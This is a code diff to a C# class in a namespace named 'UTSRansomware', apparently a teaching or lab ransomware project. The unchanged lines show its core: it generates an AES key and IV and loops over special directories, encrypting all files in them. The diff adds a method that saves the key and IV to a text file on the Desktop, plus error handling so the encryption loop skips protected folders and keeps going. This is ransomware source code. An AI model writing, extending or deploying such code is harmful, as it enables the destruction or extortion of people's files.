@@ -19,6 +19,7 @@ namespace UTSRansomware
         {
             this.key = GenerateKey();
             this.iv = GenerateIV();
+            SaveKeyAndIvToDesktop();
         }
 
         // Loops over special directories and encrypts all files in them
@@ -51,7 +52,13 @@ namespace UTSRansomware
                 {
                     EncryptFile(filePath);
                 }
-            } catch (Exception ex)
+            }
+            catch (UnauthorizedAccessException)
+            {
+                Console.WriteLine($"Access denied to: {parentDirectory}. Skipping...");
+            }
+
+            catch (Exception ex)
             {
                 Console.WriteLine(ex.ToString());
             }
@@ -113,5 +120,22 @@ namespace UTSRansomware
                 return aes.IV;
             }
         }
+
+        private void SaveKeyAndIvToDesktop()
+        {
+            string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+            string fileName = Path.Combine(desktopPath, "key_iv.txt");
+
+            // Convert key and IV to Base64 strings
+            string keyAsString = Convert.ToBase64String(this.key);
+            string ivAsString = Convert.ToBase64String(this.iv);
+
+            // Combine them into a single string and write to file
+            string combined = $"Key: {keyAsString}\nIV: {ivAsString}";
+
+            File.WriteAllText(fileName, combined);
+        }
+
+
     }
 }
